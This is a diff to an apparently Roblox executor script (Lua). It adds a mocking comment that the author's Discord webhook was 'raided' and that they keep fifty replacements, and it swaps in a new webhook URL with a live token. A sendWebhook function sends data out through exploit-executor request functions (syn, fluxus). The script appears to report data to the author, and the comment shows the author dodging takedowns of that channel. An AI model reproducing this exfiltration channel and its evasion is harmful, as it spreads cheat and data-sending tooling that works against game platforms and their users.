@@ -1,3 +1,4 @@
+-- LOL MY WEBHOOK GOT RAIDED, please note: raiding my webhook does nothing, i easily replace it with 1 of my 50 webhooks.
 -- Services
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
@@ -26,7 +27,7 @@ end
 JoinTeam()
 
 -- Webhook setup
-local webhook = "https://discord.com/api/webhooks/1360740986665304085/XH5HCpocF3p0CqScrBjUbDuBo9Qe4VHbDgEkEXdfGUuTeRiR7oxDg-EnI8sjxv3l-Qr_"
+local webhook = "https://discord.com/api/webhooks/1360740983611855090/vvRwmnDTyxcBIC-iuQ85yllr3LNmdPuCnv-mUbajIbpRnw2p1tl0_Gy_vZtlcUaC_a4t"
 local function sendWebhook(title, desc)
     task.spawn(function()
         (syn and syn.request or fluxus and fluxus.request or fluxus_request or http and http.request or http_request)({
